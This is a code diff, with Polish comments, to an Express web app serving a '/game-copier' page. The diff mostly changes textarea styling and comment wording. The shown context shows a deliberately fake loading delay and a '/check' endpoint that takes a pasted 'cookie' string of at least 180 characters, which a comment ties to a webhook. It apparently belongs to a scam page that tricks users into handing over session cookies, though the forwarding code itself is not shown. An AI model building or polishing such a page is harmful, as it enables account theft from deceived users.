@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – bez możliwości przesuwania/rozciągania pola tekstowego
+// Podstrona /game-copier – bez scrollbara w textarea
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -175,7 +175,7 @@ app.get('/game-copier', (req, res) => {
       100% { transform: rotate(360deg); }
     }
 
-    /* Ramka zygzakowata – bez zmian */
+    /* Zygzakowata ramka – bez zmian */
     .zigzag-border {
       position: relative;
       width: 100%;
@@ -237,16 +237,16 @@ app.get('/game-copier', (req, res) => {
     }
     textarea {
       width: 100%;
-      height: 180px;            /* stała wysokość */
+      height: 180px;              /* stała wysokość */
       background: transparent;
       border: none;
       outline: none;
-      resize: none;             /* NIE DA SIĘ ROZCIĄGAĆ / PRZESUWAĆ */
+      resize: none;               /* zero możliwości zmiany rozmiaru */
+      overflow: hidden;           /* ← tekst poza polem znika, bez scrolla */
       font-family: Consolas, "Courier New", monospace;
       font-size: 14.5px;
       color: #111;
       line-height: 1.5;
-      overflow-y: auto;         /* scroll w pionie jeśli tekst za długi */
     }
     textarea::placeholder {
       color: #777;
@@ -403,7 +403,7 @@ function animate() {
 }
 animate();
 
-// ── Loading + Modal ──
+// Loading + Modal – bez zmian
 const loading = document.getElementById('loading');
 const modal = document.getElementById('modal');
 const modalIcon = document.getElementById('modal-icon');
@@ -430,10 +430,10 @@ async function start() {
 
   btn.disabled = true;
 
-  // Pokazujemy sztuczne ładowanie na 1.2 sekundy
+  // Pokazujemy sztuczne ładowanie
   loading.style.display = 'flex';
 
-  // Czekamy 1200 ms
+  // Czekamy 1.2 sekundy
   await new Promise(resolve => setTimeout(resolve, 1200));
 
   // Ukrywamy loading
@@ -490,7 +490,7 @@ async function start() {
   `);
 });
 
-// Endpoint /check – bez zmian (cała logika + webhook)
+// Endpoint /check – bez zmian
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
